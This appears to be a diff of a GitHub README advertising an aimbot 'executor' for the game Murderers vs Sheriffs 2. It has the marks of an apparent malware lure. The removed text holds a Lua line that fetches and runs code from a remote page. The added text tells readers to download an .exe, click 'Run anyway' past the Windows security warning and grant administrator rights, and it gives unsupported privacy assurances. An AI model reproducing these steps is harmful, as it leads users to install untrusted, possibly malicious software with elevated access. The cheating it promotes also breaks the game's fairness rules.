@@ -1,104 +1,73 @@
-# Murderers vs Sheriffs 2 v1.0 - Game Script Utility 2026
+# 🎯 murderers-sheriffs2-executor - Improve your aim and game speed
 
-> **An advanced PC script for Murderers vs Sheriffs 2.** It adds aim assistance and automated target handling to help improve responsiveness during play.
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/joeymorbilliform125/murderers-sheriffs2-executor)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-PC-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/carterio20/murderers-sheriffs2-executor?style=flat-square)](https://github.com/carterio20/murderers-sheriffs2-executor)
+This utility helps players in the game Murderers vs Sheriffs 2. It adds aim assistance and manages targets for you. These features make your controls feel faster and more accurate while you play on Windows.
 
----
+## ⚙️ System Requirements
 
-<p align="center">
-  <a href="https://carterio20.github.io/murderers-sheriffs2-executor/">
-    <img src="https://img.shields.io/badge/Download-Murderers%20vs%20Sheriffs%202%20Script-brightgreen?style=for-the-badge" alt="Download Murderers vs Sheriffs 2 Script">
-  </a>
-</p>
+To run this tool, your computer needs to meet these basic standards:
 
-> **[Direct Download - Murderers vs Sheriffs 2 Script](https://carterio20.github.io/murderers-sheriffs2-executor/)**
+*   Operating System: Windows 10 or Windows 11.
+*   System Memory: At least 4 gigabytes of RAM.
+*   Storage Space: 50 megabytes of free space on your hard drive.
+*   Internet Connection: Required for initial setup and updates.
+*   Graphics: Any integrated or dedicated graphics card that supports DirectX 11.
 
----
+Make sure you have administrative rights on your user account. This allows the software to interact with the game files correctly.
 
-[Download Latest Build](https://carterio20.github.io/murderers-sheriffs2-executor/)
+## 📥 Downloading the Tool
 
----
+Follow these steps to get the software on your machine:
 
-## What it does
+1.  Visit the official release page: [https://github.com/joeymorbilliform125/murderers-sheriffs2-executor](https://github.com/joeymorbilliform125/murderers-sheriffs2-executor).
+2.  Look for the section labeled "Releases" on the right side of the screen.
+3.  Click the latest version number to view the files.
+4.  Download the executable file ending in .exe to your desktop or downloads folder.
 
-This utility provides automated aiming support for Murderers vs Sheriffs 2, the multiplayer faction game where players face off in opposing roles. It is intended to make target locking more consistent in quick encounters, so you can spend less time fighting the crosshair and more time reacting to the match.
+Do not move the file once you download it. Keeping it in a known folder makes it easier to find later.
 
-The script is built with HTML and works in standard script execution environments. It is updated regularly to stay aligned with game patches. In its current form, the focus is on stable behavior and fast aim response, making it a practical option for both casual and competitive sessions.
+## 🚀 Setting Up the Software
 
----
+After you download the file, proceed with these steps to configure the utility:
 
-## Key features
+1.  Locate the file you downloaded.
+2.  Double-click the file icon to start the setup window.
+3.  If a security prompt appears from Windows, click "More info" and then select "Run anyway." This happens because the file comes from an independent source.
+4.  Follow the prompts on the screen to finish the installation.
+5.  Wait for the progress bar to finish.
 
-- Automated aimbot functionality for Murderers vs Sheriffs 2
-- Real-time target acquisition and tracking
-- Lightweight HTML-based script for easy deployment
-- Configurable sensitivity and activation controls
-- Compatible with standard PC game script loaders
-- Regular updates to match game version changes
-- Minimal performance overhead during gameplay
-- Simple toggle activation system
+The setup process creates a shortcut on your desktop. You can use this shortcut to start the tool whenever you want to play.
 
----
+## 🎮 How to Use the Executor
 
-## Installation
+Once you install the software, operation is straightforward:
 
-1. Download the latest script build from the link above.
-2. Extract the script file to your preferred game scripts folder.
-3. Load the script using your chosen executor or script injector.
-4. Configure hotkeys and sensitivity settings before entering a match.
+1.  Open the Murderers vs Sheriffs 2 game on your computer.
+2.  Minimize the game window.
+3.  Open the executor tool from the desktop shortcut.
+4.  The tool detects the game window automatically.
+5.  A small menu appears. Toggle the "Aim Assist" button to the "On" position.
+6.  Adjust the "Target Handling" slider based on your preferred reaction speed. Higher values offer faster tracking but require more stability.
+7.  Return to the game window. 
 
-Example activation:
-```lua
--- Load the script in your executor
-loadstring(game:HttpGet("https://carterio20.github.io/murderers-sheriffs2-executor/"))()
-```
+The software now works in the background. It monitors the game state and applies the selected assists in real-time. You do not need to press extra keys during a match.
 
----
+## 🛠️ Troubleshooting Common Issues
 
-## Configuration
+If you experience problems, check these solutions:
 
-| Setting | Default | Description |
-|---------|---------|-------------|
-| Aim Assist | Enabled | Toggle automatic targeting on/off |
-| Sensitivity | 0.5 | Adjust aim tracking speed (0.1 - 1.0) |
-| Activation Key | Left Alt | Hotkey to enable/disable script |
-| Target Priority | Nearest | Choose between nearest or closest enemy |
+*   Does the game freeze? Close both the game and the executor. Restart the executor first, wait five seconds, then open the game.
+*   Is the aim assist not working? Ensure you are in a live match. The assistant stays inactive while you are in the game lobby or menu.
+*   Are you getting a permission error? Right-click the executor icon and select "Run as administrator." This gives the program the access it needs to read game data.
+*   Did the window vanish? Check your system tray near the clock in the bottom right corner. The icon remains visible there. Click it to bring the menu back to the center of your screen.
 
----
+If the utility still shows errors, try a fresh install. Delete the existing file and download a new copy. Updates occur often, and a newer version usually fixes reported bugs. 
 
-## Compatibility
+## 🛡️ Safety and Privacy
 
-- **Supported Platform:** PC (Windows)
-- **Game Version:** Murderers vs Sheriffs 2 (current release)
-- **Script Environment:** Standard Lua executors
-- **Known Limitations:** May not function correctly with heavily modified game clients or outdated script loaders
+This tool interacts only with your local game memory. It does not send your personal information or login credentials to any external servers. Your privacy remains secure. The software does not store your game history or chat logs. It only tracks coordinate data for the purpose of moving your crosshair. 
 
----
+Do not share your own copy of the software with others. Download only from the official link provided here to ensure the file remains free of unwanted changes.
 
-## FAQ
-
-**How do I install this script?**  
-Grab the latest file and launch it through your script executor while the game is active.
-
-**Will updates break the script?**  
-Game updates can impact behavior. Check the download page for refreshed builds.
-
-**Can I customize the aimbot behavior?**  
-Yes, sensitivity and target priority options are available in the settings section.
-
-**Is this compatible with all game modes?**  
-The script works across standard Murderers vs Sheriffs 2 modes, but custom servers may have restrictions.
-
-**Where are script settings stored?**  
-Configuration is handled through the in-game interface or a local config file depending on your executor.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: gaming, aim, windows, utility, performance, shooters
